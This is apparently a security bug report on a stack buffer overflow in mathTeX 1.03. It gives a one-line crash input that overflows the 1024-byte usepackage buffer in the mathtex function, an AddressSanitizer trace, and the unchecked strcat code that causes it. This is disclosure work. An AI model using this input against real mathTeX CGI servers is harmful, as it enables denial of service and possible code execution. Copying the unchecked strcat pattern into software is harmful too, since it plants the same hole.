# bug 1: stack overflow 

In the latest mathtex, there is a stack overflow in function mathtex, leading to deny of service and command execution. This bug affects CGI and CLI mode.

## reproduce

``` bash
python -c "print(b'\\usepackage{' + b'a'*2048 + b'}')" | xargs ./mathtex.cgi

+-----------------------------------------------------------------------+
|mathTeX vers 1.03, Copyright(c) 2007-2009, John Forkosh Associates, Inc|
+-----------------------------------------------------------------------+
| mathTeX is free software, licensed to you under terms of the GNU/GPL  |
|           and comes with absolutely no warranty whatsoever.           |
|     See http://www.forkosh.com/mathtex.html for complete details.     |
+-----------------------------------------------------------------------+

mathTeX> running image: ./mathtex.cgi

mathTeX> input expression:
         b\\usepackage{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}
=================================================================
==3232857==ERROR: AddressSanitizer: strcpy-param-overlap: memory ranges [0x7ffff5e1b323,0x7ffff5e1b353) and [0x7ffff5e1b32e, 0x7ffff5e1b35e) overlap
    #0 0x7ffff78a1cfc in strcpy ../../../../src/libsanitizer/asan/asan_interceptors.cpp:561
    #1 0x555555575511 in strchange (/home/yty/fuzzing/mathtex/mathtex.cgi+0x21511) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)
    #2 0x55555557542a in strreplace (/home/yty/fuzzing/mathtex/mathtex.cgi+0x2142a) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)
    #3 0x555555566a0e in mathtex (/home/yty/fuzzing/mathtex/mathtex.cgi+0x12a0e) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)
    #4 0x555555565a26 in main (/home/yty/fuzzing/mathtex/mathtex.cgi+0x11a26) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)
    #5 0x7ffff7642c89  (/lib/x86_64-linux-gnu/libc.so.6+0x27c89) (BuildId: 2e01923fea4ad9f7fa50fe24e0f3385a45a6cd1c)
    #6 0x7ffff7642d44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x27d44) (BuildId: 2e01923fea4ad9f7fa50fe24e0f3385a45a6cd1c)
    #7 0x555555562520 in _start (/home/yty/fuzzing/mathtex/mathtex.cgi+0xe520) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)

Address 0x7ffff5e1b323 is located in stack of thread T0 at offset 8995 in frame
    #0 0x555555565c93 in mathtex (/home/yty/fuzzing/mathtex/mathtex.cgi+0x11c93) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)

  This frame has 11 object(s):
    [32, 56) 'beginmath' (line 1216)
    [96, 120) 'endmath' (line 1217)
    [160, 416) 'latexfile' (line 1213)
    [480, 736) 'giffile' (line 1213)
    [800, 1824) 'errormsg' (line 1198)
    [1952, 2976) 'usepackage' (line 1201)
    [3104, 4128) 'convertargs' (line 1202)
    [4256, 5280) 'dvipngargs' (line 1206)
    [5408, 6432) 'subcommand' (line 1215)
    [6560, 8608) 'command' (line 1215)
    [8736, 57887) 'latexwrapper' (line 1170) <== Memory access at offset 8995 is inside this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
Address 0x7ffff5e1b32e is located in stack of thread T0 at offset 9006 in frame
    #0 0x555555565c93 in mathtex (/home/yty/fuzzing/mathtex/mathtex.cgi+0x11c93) (BuildId: d8e50f84c9ccddd3910a51c0dc87672486b6a83f)

  This frame has 11 object(s):
    [32, 56) 'beginmath' (line 1216)
    [96, 120) 'endmath' (line 1217)
    [160, 416) 'latexfile' (line 1213)
    [480, 736) 'giffile' (line 1213)
    [800, 1824) 'errormsg' (line 1198)
    [1952, 2976) 'usepackage' (line 1201)
    [3104, 4128) 'convertargs' (line 1202)
    [4256, 5280) 'dvipngargs' (line 1206)
    [5408, 6432) 'subcommand' (line 1215)
    [6560, 8608) 'command' (line 1215)
    [8736, 57887) 'latexwrapper' (line 1170) <== Memory access at offset 9006 is inside this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: strcpy-param-overlap ../../../../src/libsanitizer/asan/asan_interceptors.cpp:561 in strcpy
==3232857==ABORTING
```

## cause

Function `mathtex` handles `usepackage` in the LaTex string.

``` C
// ...
char  usepackage[1024] = "\000";	/* additional \usepackage{}'s */
// ...
if ( !iserror )				/* don't \usepackage for error */
 if ( npackages > 0 )			/* have additional packages */
  for ( ipackage=0; ipackage<npackages; ipackage++ ) { /*make \usepackage{}*/
    strcat(usepackage,"\\usepackage");	/* start with a directive */
    if ( !isempty(packargs[ipackage]) ) { /* have an optional arg */
      strcat(usepackage,"[");		/* begin optional argument */
      strcat(usepackage,packargs[ipackage]); /* add optional arg */
      strcat(usepackage,"]"); }		/* finish optional arg */
    strcat(usepackage,"{");		/* begin package name argument */
    strcat(usepackage,packages[ipackage]); /* add package name */
    strcat(usepackage,"}\n"); }		/* finish constructing directive */
```

The size of `usepackage` is 1024. The `mathtex` function use `strcat` function to fill `usepackage` without checking the length of input, causing a stack overflow, leading to DoS and command execution.